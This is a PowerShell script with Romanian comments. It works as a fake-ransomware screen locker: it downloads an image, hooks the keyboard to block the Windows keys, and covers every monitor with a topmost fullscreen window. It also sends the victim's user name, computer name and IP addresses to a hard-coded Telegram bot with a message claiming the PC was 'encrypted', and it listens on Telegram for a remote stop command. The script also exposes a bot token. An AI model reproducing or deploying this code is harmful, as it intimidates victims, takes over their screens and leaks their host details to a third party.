# URL-ul imaginii
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"

# Descărcare imagine
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        exit
    }
}

# Blocare taste Windows și monitorizare pentru închidere
function Block-And-MonitorKeys {
    Add-Type @"
        using System;
        using System.Runtime.InteropServices;

        public class KeyboardMonitor {
            private static IntPtr hookId = IntPtr.Zero;
            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
            private static LowLevelKeyboardProc proc = HookCallback;
            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;

            [DllImport("user32.dll")]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
            [DllImport("user32.dll")]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);
            [DllImport("user32.dll")]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
            [DllImport("kernel32.dll")]
            private static extern IntPtr GetModuleHandle(string lpModuleName);

            public static void BlockAndMonitor() {
                hookId = SetHook(proc);
            }

            public static void Unblock() {
                UnhookWindowsHookEx(hookId);
            }

            private static IntPtr SetHook(LowLevelKeyboardProc proc) {
                using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
                using (var curModule = curProcess.MainModule) {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }

            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                    int vkCode = Marshal.ReadInt32(lParam);
                    if (vkCode == 0x43) { Environment.Exit(0) }  # tasta C
                    if (vkCode == 0x5B || vkCode == 0x5C) { return (IntPtr)1 }  # tastele Windows
                }
                return CallNextHookEx(hookId, nCode, wParam, lParam);
            }
        }
"@
    [KeyboardMonitor]::BlockAndMonitor()
}

# Afișare imagine pe toate monitoarele
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screens = [System.Windows.Forms.Screen]::AllScreens
    $forms = @()

    foreach ($screen in $screens) {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.StartPosition = 'Manual'
        $form.Location = $screen.Bounds.Location
        $form.Size = $screen.Bounds.Size

        try {
            $img = [System.Drawing.Image]::FromFile($tempImagePath)
        } catch {
            exit
        }

        $pictureBox = New-Object System.Windows.Forms.PictureBox
        $pictureBox.Image = $img
        $pictureBox.Dock = 'Fill'
        $pictureBox.SizeMode = 'StretchImage'
        $form.Controls.Add($pictureBox)

        $forms += $form
    }

    foreach ($form in $forms) {
        [void]$form.Show()
    }

    [System.Windows.Forms.Application]::Run()
}

# Trimite mesaj inițial Telegram
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress

try { $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string] } catch { $ipPublic = "n/a" }

$message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
$uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
$body = @{ chat_id = '656189986'; text = $message } | ConvertTo-Json -Compress
try { Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json' } catch {}

# Start listener pentru Telegram - comanda de oprire
Start-Job -ScriptBlock {
    $token = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
    $chatId = '656189986'
    $target1 = "👍 Codrut"
    $target2 = "👍 $env:COMPUTERNAME"
    $offset = 0

    while ($true) {
        try {
            $url = "https://api.telegram.org/bot$token/getUpdates?offset=$offset"
            $updates = Invoke-RestMethod -Uri $url -TimeoutSec 5
            foreach ($update in $updates.result) {
                $offset = $update.update_id + 1
                if ($update.message.text -eq $target1 -or $update.message.text -eq $target2) {
                    [Environment]::Exit(0)
                }
            }
        } catch {}
        Start-Sleep -Seconds 5
    }
} | Out-Null

# Execuție principală
Download-Image
Block-And-MonitorKeys
Show-FullScreenImage
